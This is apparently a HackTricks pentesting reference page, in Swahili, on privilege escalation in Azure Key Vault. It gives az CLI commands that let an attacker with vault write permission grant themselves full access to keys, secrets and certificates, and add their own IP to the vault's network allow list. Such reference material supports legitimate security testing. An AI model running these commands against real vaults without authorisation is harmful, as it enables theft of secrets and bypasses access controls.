# Az - Key Vault Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Azure Key Vault

Kwa maelezo zaidi kuhusu huduma hii angalia:

{{#ref}}
../az-services/az-keyvault.md
{{#endref}}

### `Microsoft.KeyVault/vaults/write`

Mshambuliaji mwenye ruhusa hii ataweza kubadilisha sera ya vault ya funguo (vault ya funguo lazima itumie sera za ufikiaji badala ya RBAC).
```bash
# If access policies in the output, then you can abuse it
az keyvault show --name <vault-name>

# Get current principal ID
az ad signed-in-user show --query id --output tsv

# Assign all permissions
az keyvault set-policy \
--name <vault-name> \
--object-id <your-object-id> \
--key-permissions all \
--secret-permissions all \
--certificate-permissions all \
--storage-permissions all
```
### Modify Network Restrictions

Inaweza kuwa nawezo wa kuwa na ruhusa ya kutosha kufikia data nyeti (kama vile thamani ya siri) lakini huwezi kuifikia kwa sababu vault ya funguo imewekwa mipaka kwa mtandao maalum. Ikiwa una ruhusa ya kubadilisha mipaka ya mtandao unaweza kuongeza IP yako kwenye orodha ya IP zinazoruhusiwa.
```bash
# Get the current network restrictions
az keyvault network-rule list --name <vault-name>

# Add your IP to the list
az keyvault network-rule add --name <vault-name> --ip-address <your-ip>
```
{{#include ../../../banners/hacktricks-training.md}}
